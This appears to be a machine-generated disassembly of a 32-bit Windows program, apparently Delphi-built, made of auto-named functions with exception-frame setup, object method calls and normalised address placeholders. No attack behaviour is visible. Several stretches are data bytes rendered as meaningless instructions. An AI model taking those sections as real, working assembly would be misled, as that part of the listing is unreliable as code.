mov eax [ ebp + 0x8 ]
mov [ edi + 0x68 ] eax
mov [ edi + 0x6c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47ce20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_4038a4#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x6c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47cf94
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0x88 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_47cd84
mov edx [ eax ]
call [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x68 ] eax
mov edx ebx
call sub_479494
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x68 ]
mov [ eax + 0x70 ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
mov esi [ ebx + 0x98 ]
test esi esi
jle r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d564
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0xac ]
mov edx [ ebp - 0xc ]
call sub_418cec
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx esi
mov eax [ ebx + 0xac ]
call sub_47b1d0
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_47cd84
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_418d88
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x94 ]
mov eax [ ebp - 0x8 ]
call sub_47a0c4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x58 ]
lea eax [ ebp - 0xc ]
call sub_40d564
jmp r-xdata
sub_47cf94
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_478ba4
mov [ edi + 0xb8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47cfd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_47d021
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_479480
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_47d026
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf ] 0x1
call sub_403a8c
call sub_403ae0
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_479480
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_47d0a0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47aad8
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov edx [ eax + 0xb8 ]
test edx edx
je r-xdata
lea eax [ ebx + 0x68 ]
call sub_40d564
mov esi edx
mov eax [ esi + 0xac ]
test eax eax
je r-xdata
mov eax esi
call sub_47cd84
test eax eax
je r-xdata
mov edx ebx
call sub_418d88
mov eax esi
call sub_47cd84
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_47d0f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47d266
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_47d21e
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push j_sub_4038a4#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d26d
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_47d17a
add eax [ eax ]
add [ eax ] al
pushad
adc al 0x47
add [ esi - 0x33ffb82f ] dl
or al [ edi ]
enter 0x47d1 0x0
or [ edx ] cl
inc edi
add cl ah
rol [ edi ] 0x1
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
call sub_47c63c
mov eax [ ebx + 0xc ]
add eax 0xffffd8bb
sub eax 0x2
jae r-xdata
call sub_403ae0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d26d
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_47d1e1
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_47c63c
call sub_403ae0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d26d
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_47d223
add [ eax ] eax
add [ eax ] al
push 0x2f004072
rol [ edi ] cl
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_47c63c
call sub_403a8c
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d26d
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_47d274
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ r-xdata ]
push eax
mov ecx esi
xor edx edx
mov eax edi
call sub_419a68
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47d2d8
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47d5f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call sub_4040ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_4080e8
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d5fc
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_4040d0
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_47d804
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_47d5cb
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
add eax 0x10
mov edx ebx
call sub_404100
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x14 ]
add eax 0x20
mov edx [ ebp - 0x10 ]
call sub_404100
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_40436c
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_4045cc
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
call sub_4080e8
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_40436c
mov edx eax
inc edx
mov ecx 0x7fffffff
mov eax ebx
call sub_4045cc
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_40436c
mov ecx eax
inc ecx
mov edx 0x1
mov eax ebx
call sub_4045cc
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0xc ]
call sub_404294
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x1c ]
call sub_4043b8
mov edx [ ebp - 0x1c ]
pop eax
call sub_4080e8
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_40436c
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
mov eax ebx
call sub_4045cc
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor ecx ecx
push ebp
push j_sub_4038a4#7
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0x28 ]
cmp bl 0x20
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_404294
mov ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_47b058
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx r-xdata
mov eax [ ebp - 0x10 ]
call sub_47af74
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_47d8c0
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_47a120
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_47a120
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
sub_47d4cd
add [ eax ] eax
add [ eax ] al
push 0xd9004072
aam 0x47
add [ ebx + 0x7a80ec55 ] cl
or al 0x0
je r-xdata
call sub_403a8c
call sub_403ae0
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x2c ]
test edx edx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_47d8c0
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov edx [ edx + 0xf0 ]
test edx edx
jle r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_476ea4
mov eax [ ebp - 0x14 ]
call sub_47d8c0
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_47a120
jmp r-xdata
call sub_403a8c
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_476ea4
mov eax [ ebp - 0x14 ]
call sub_47d8c0
jmp r-xdata
call sub_403ae0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_47a120
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
sub_47d60b
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffef8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47d6cf
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_419304
mov [ esi + 0xc ] 0x20
mov [ esi + 0x19 ] 0x1
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x8 ]
call sub_408288
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x108 ]
mov eax [ esi ]
call sub_403200
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_404310
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x1c ]
pop ecx
call sub_4043b8
mov [ esi + 0x28 ] 0x20
mov [ esi + 0x29 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x34 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d6d6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
add esp 0xfffffff0
call sub_4035fc
sub_47d6f4
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x34 ]
call sub_40d564
lea eax [ esi + 0x30 ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41933c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_47d740
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47d7bd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_4193d0
mov eax [ ebx + 0x4 ]
call sub_47d2cc
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4034ac
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_40442c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d7c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
sub_47d7cf
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_404100
mov edx esi
mov eax ebx
call sub_4194b0
pop esi
pop ebx
retn
sub_47d804
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b2c
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x18 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47d868
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d564
lea eax [ esi + 0x18 ]
call sub_40d564
lea eax [ esi + 0x8 ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_47d8c0
push ebx
mov ebx eax
mov [ ebx + 0xc ] 0x0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x9c ]
mov edx [ ebx + 0x14 ]
call sub_476f8c
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx [ ebx + 0x14 ]
call sub_47a0c4
pop ebx
retn
sub_47d8f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47d915
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d91c
retn
sub_47da50
clc
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001c ] al
outsb
inc ebx
outsd
insd
insd
popad
outsb
push ecx
dec edi
push esp
inc esp
cmp al 0x10
inc eax
add [ eax + ecx * 8 + 0x540047 ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x11 ] al
pop es
add [ ebx ] cl
inc esp
popa
jne r-xdata
mov eax [ esi + 0xfc ]
call [ esi + 0xf8 ]
je r-xdata
mov bl 0x1
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
outsd
jb r-xdata
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
cmp [ esi + 0xfa ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
inc edi
push 0x52ff108b
pop eax
mov eax eax
push ebx
push esi
test dl dl
je r-xdata
mov edx edi
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47c438
mov edx 0x11
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47dadc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov bl 0x1
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0xfa ] 0x0
je r-xdata
mov edx edi
mov eax [ esi + 0xfc ]
call [ esi + 0xf8 ]
sub_47db18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47db3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47db44
retn
sub_47db54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp ah bl
inc edi
add [ esp + ebx * 8 + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x24 ] ah
inc edi
add ah ah
add [ eax ] al
add [ eax * 4 + 0x1ae00047 ] bh
inc edx
add ah ch
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x21 ] dl
inc edi
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ esp + edx * 4 + 0x47 ] cl
add al dl
pop ss
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
push edi
inc edi
add [ ecx * 4 - 0x6bebffb9 ] ah
inc edi
add [ eax ] al
mov al [ edi ]
test al 0x8a
inc edi
add [ eax - 0x63 ] ch
inc edi
add [ eax ] bh
lahf
inc edi
add [ ebx + ecx * 4 + 0x47 ] bh
add ah ch
mov [ edi ] es
pushfd
0x8d440047 0x47
int3
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
adc bh bl
inc edi
add [ esi + edx * 2 + 0x56ec0047 ] dh
inc edi
add [ edi + edx * 2 ] bl
sub_47debc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor eax eax
push ebp
push sub_47df02
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47df09
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
retn
sub_47df10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_478ba4
xor eax eax
mov [ esi + 0xbc ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47df50
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_478c88
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_47dfb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47dfdd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dfe4
retn
sub_47e052
inc edi
add [ ebx + ebp * 8 + 0x47 ] ah
add [ edx + ebp * 4 - 0x555fffb9 ] dh
inc edi
add ah dh
rol [ edi ] 0x1
sbb bl ch
inc edi
add [ eax - 0x57 ] ah
inc edi
add al al
test eax 0xaacc0047
inc edi
add [ eax - 0x57ffb85a ] bl
jmp r-xdata
mov ebp 0x47
outsb
arpl [ gs : ebp + eax * 2 + 0x76 ] si
outsb
je r-xdata
push eax
outsd
jb r-xdata
add cl [ eax ]
pop es
inc ecx
push esp
push 0x64616572
adc edx [ ecx + ecx * 2 + 0x64 ]
dec ebp
popad
jo r-xdata
push esp
inc ebx
push eax
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
inc eax
add [ edx + esi + 0x40 ] ah
push eax
loopne r-xdata
inc edi
add [ eax ] cl
sbb [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
popad
jo r-xdata
push edi
inc edi
add ah bl
call 0xffffffffe8cbe25d
inc edi
add ah dh
call 0xffffffffcdffe265
inc edi
add [ eax ] al
leave
inc edi
add [ eax ] bl

inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
aam 0xe7
inc edi
add [ esi + edx * 2 + 0x56ec0047 ] dh
inc edi
add [ edi + edx * 2 ] bl
inc ecx
add al ch
nop
nop
push esp
push 0x64616572
or [ edx ] cl
dec ecx
dec ebp
cmovns esp [ ebp + ecx * 2 + 0x61 ]
jo r-xdata
add [ edi * 4 + 0x47 ] dl
jo r-xdata
push eax
outsd
jb r-xdata
add [ eax * 8 - 0x6f6fffb9 ] dl
jo r-xdata
movsb [ edi ] [ esi ]
loopne r-xdata
push eax
outsd
jb r-xdata
hlt
outsd
jb r-xdata
push eax
inc ecx
inc ebp
js r-xdata
popad
or [ fs : edx ] cl
push esp
push 0x64616572
inc ebp
jbe r-xdata
add [ eax + ecx * 8 + 0x17d00047 ] ch
inc edx
add al cl
imul ebp [ edi + 0x6e ] 0x63784509
jo r-xdata
add [ eax + 0x32 ] cl
add al dl
jb r-xdata
add ah dl
loope r-xdata
push esp
push 0x64616572
add [ eax - 0x3f74ffb9 ] ah
and al 0xe1
inc edi
add [ eax ] cl
and [ ecx + ecx * 2 + 0x64 ] edx
dec ebp
popad
jo r-xdata
outsb
je r-xdata
sbb [ edx ] al
clc
sbb al [ edx ]
